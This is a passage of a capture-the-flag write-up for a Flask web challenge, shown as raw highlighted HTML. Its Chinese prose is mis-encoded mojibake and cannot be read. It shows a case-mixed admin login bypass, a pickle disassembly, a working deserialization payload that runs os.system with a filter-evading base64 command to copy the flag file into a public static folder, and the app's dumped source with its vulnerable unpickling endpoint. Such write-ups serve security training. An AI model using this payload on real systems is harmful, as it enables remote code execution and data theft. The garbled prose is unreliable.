keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://web-67b31d46ab.challenge.longjiancup.cn</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">30</span></span>username=aDmiN&amp;password=123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°±å‘ç°èƒ½ç™»å½•äº†</p><p>æ¥ä¸‹æ¥æ˜¯æ–‡ä»¶ä¸Šä¼ æ‰“ pickleï¼Œå…ˆä¸‹è½½ example.pkl æ‹¿ pickletools çœ‹çœ‹æ ¼å¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">    <span class="token number">0</span><span class="token punctuation">:</span> \x80 PROTO      <span class="token number">4</span>    <span class="token number">2</span><span class="token punctuation">:</span> \x95 FRAME      <span class="token number">112</span>   <span class="token number">11</span><span class="token punctuation">:</span> \x8c SHORT_BINUNICODE <span class="token string">'__main__'</span>   <span class="token number">21</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">0</span><span class="token punctuation">)</span>   <span class="token number">22</span><span class="token punctuation">:</span> \x8c SHORT_BINUNICODE <span class="token string">'CHIKAWA'</span>   <span class="token number">31</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">1</span><span class="token punctuation">)</span>   <span class="token number">32</span><span class="token punctuation">:</span> \x93 STACK_GLOBAL   <span class="token number">33</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token number">34</span><span class="token punctuation">:</span> <span class="token punctuation">)</span>    EMPTY_TUPLE   <span class="token number">35</span><span class="token punctuation">:</span> \x81 NEWOBJ   <span class="token number">36</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">3</span><span class="token punctuation">)</span>   <span class="token number">37</span><span class="token punctuation">:</span> <span class="token punctuation">&#125;</span>    EMPTY_DICT   <span class="token number">38</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">4</span><span class="token punctuation">)</span>   <span class="token number">39</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>    MARK   <span class="token number">40</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'model_name'</span>   <span class="token number">52</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">5</span><span class="token punctuation">)</span>   <span class="token number">53</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'Example'</span>   <span class="token number">62</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">6</span><span class="token punctuation">)</span>   <span class="token number">63</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'data'</span>   <span class="token number">69</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">7</span><span class="token punctuation">)</span>   <span class="token number">70</span><span class="token punctuation">:</span> C        SHORT_BINBYTES <span class="token string">b"cbuiltins\nprint\n(S'chikawa'\ntR."</span>  <span class="token number">103</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token number">104</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'parameters'</span>  <span class="token number">116</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">9</span><span class="token punctuation">)</span>  <span class="token number">117</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">''</span>  <span class="token number">119</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">10</span><span class="token punctuation">)</span>  <span class="token number">120</span><span class="token punctuation">:</span> u        SETITEMS   <span class="token punctuation">(</span>MARK at <span class="token number">39</span><span class="token punctuation">)</span>  <span class="token number">121</span><span class="token punctuation">:</span> b    BUILD  <span class="token number">122</span><span class="token punctuation">:</span> <span class="token punctuation">.</span>    STOPhighest protocol among opcodes <span class="token operator">=</span> <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œè¿”å› module_name Example, None</p><p>å¯è§æˆ‘ä»¬éœ€è¦ä¿®æ”¹å…¶ä¸­çš„ data éƒ¨åˆ†ï¼Œæ‰“å…¥æˆ‘ä»¬çš„ opcode</p><p>æ¥ä¸‹æ¥å°±æ˜¯æµ‹ wafï¼Œæµ‹äº†ä¸€ä¸ªå¤šå°æ—¶æ‰å‘ç° waf çš„æ˜¯å‘½ä»¤æ‰§è¡Œä¸æ˜¯ pickleã€‚ã€‚ã€‚</p><p>å¦ä¸€ä¸ªå‘æ˜¯è¿™é‡Œç”¨ <code>ca\\t</code> è¯»å–ä¼šè¿”å› 32512ï¼Œä¸çŸ¥é“ä»€ä¹ˆæŠ¥é”™ï¼Œæ­£å¸¸çš„è¯ä¼šè¿”å› module_name Example,0</p><p>äºæ˜¯æ‰§è¡Œç»“æœå†™å…¥ static ä¸‹é™æ€æ–‡ä»¶å¸¦å¤–</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">CHIKAWA</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span>opcode<span class="token operator">=</span><span class="token triple-quoted-string string">b'''cossystemp00g0(S'bas\\e64 /f??? -w 0 >/app/static/4.txt'tR.'''</span>obj <span class="token operator">=</span> CHIKAWA<span class="token punctuation">(</span><span class="token punctuation">)</span>obj<span class="token punctuation">.</span>model_name <span class="token operator">=</span> <span class="token string">'Example'</span>obj<span class="token punctuation">.</span>data <span class="token operator">=</span> opcodeobj<span class="token punctuation">.</span>parameters <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.pkl'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dump ä¸‹æ¥çš„æºç ï¼š</p><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> session<span class="token punctuation">,</span> flash<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>security <span class="token keyword">import</span> generate_password_hash<span class="token punctuation">,</span> check_password_hash<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename<span class="token keyword">import</span> sqlite3<span class="token keyword">import</span> os<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token keyword">import</span> pickle<span class="token punctuation">,</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> re<span class="token keyword">from</span> chikawa <span class="token keyword">import</span> CHIKAWA<span class="token keyword">import</span> unicodedata<span class="token keyword">from</span> flask <span class="token keyword">import</span> send_from_directoryapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>CHIKAWA <span class="token operator">=</span> CHIKAWAapp<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'your_secret_key_here'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'uploads'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'DATABASE'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'database.db'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'ALLOWED_EXTENSIONS'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'pkl'</span><span class="token punctuation">&#125;</span>os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">prepare</span><span class="token punctuation">(</span>node<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> node <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    node <span class="token operator">=</span> unicodedata<span class="token punctuation">.</span>normalize<span class="token punctuation">(</span><span class="token string">"NFKC"</span><span class="token punctuation">,</span> node<span class="token punctuation">)</span>    node <span class="token operator">=</span> node<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    node <span class="token operator">=</span> node<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> node<span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> app<span class="token punctuation">.</span>app_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'DATABASE'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''            CREATE TABLE IF NOT EXISTS users (                id INTEGER PRIMARY KEY AUTOINCREMENT,                username TEXT UNIQUE NOT NULL,                password TEXT NOT NULL            )        '''</span><span class="token punctuation">)</span>        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''            CREATE TABLE IF NOT EXISTS models (                id INTEGER PRIMARY KEY AUTOINCREMENT,                user_id INTEGER NOT NULL,                filename TEXT NOT NULL,                upload_time DATETIME NOT NULL,                FOREIGN KEY (user_id) REFERENCES users (id)            )        '''</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>init_db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'DATABASE'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login_required</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">from</span> functools <span class="token keyword">import</span> wraps    <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">decorated_function</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'user_id'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> decorated_function<span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token keyword">and</span> \           filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'ALLOWED_EXTENSIONS'</span><span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    waf_patterns <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">r'/\*.*\*/'</span><span class="token punctuation">,</span>        <span class="token string">r'(?i)(and|or|\&amp;\&amp;|\|\|)'</span><span class="token punctuation">,</span>        <span class="token string">r'[\s\+\-\*\/]'</span><span class="token punctuation">,</span>        <span class="token string">r'union|select|from|where'</span><span class="token punctuation">,</span>        <span class="token string">r';|--|#'</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token keyword">for</span> pattern <span class="token keyword">in</span> waf_patterns<span class="token punctuation">:</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>                name <span class="token operator">=</span> prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>        <span class="token keyword">if</span> name <span class="token operator">!=</span> <span class="token string">"admin"</span> <span class="token keyword">and</span> name <span class="token operator">!=</span> <span class="token string">"Admin"</span> <span class="token keyword">and</span> name <span class="token operator">!=</span> <span class="token string">"á´¬dmin"</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"only admin can login"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token keyword">or</span> waf<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid input detected'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        conn <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>        cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT * FROM users WHERE username = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> user <span class="token keyword">and</span> check_password_hash<span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'panel'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> generate_password_hash<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">or</span> username <span class="token operator">==</span> <span class="token string">"Admin"</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"no access, try bypass"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>                name <span class="token operator">=</span> prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>        conn <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>        cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'INSERT INTO users (username, password) VALUES (?, ?)'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span>            conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>            conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> sqlite3<span class="token punctuation">.</span>IntegrityError<span class="token punctuation">:</span>            conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            flash<span class="token punctuation">(</span><span class="token string">'Username already exists'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/panel'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">panel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'panel.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'No file selected'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'No selected file'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">file</span> <span class="token keyword">and</span> allowed_file<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>            filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>            save_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>            <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>save_path<span class="token punctuation">)</span>            conn <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>            cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''                INSERT INTO models (user_id, filename, upload_time)                VALUES (?, ?, ?)            '''</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">,</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>            conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            flash<span class="token punctuation">(</span><span class="token string">'File uploaded successfully'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'model'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Only .pkl files are allowed'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/model'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">model</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    conn <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''        SELECT id, filename, upload_time, user_id         FROM models         ORDER BY upload_time DESC    '''</span><span class="token punctuation">)</span>    models <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'model.html'</span><span class="token punctuation">,</span> models<span class="token operator">=</span>models<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/execute/&lt;int:model_id>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">execute</span><span class="token punctuation">(</span>model_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    conn <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT filename FROM models WHERE id = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>model_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    file_record <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> file_record<span class="token punctuation">:</span>        file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file_record<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                model <span class="token operator">=</span> CHIKAWA<span class="token 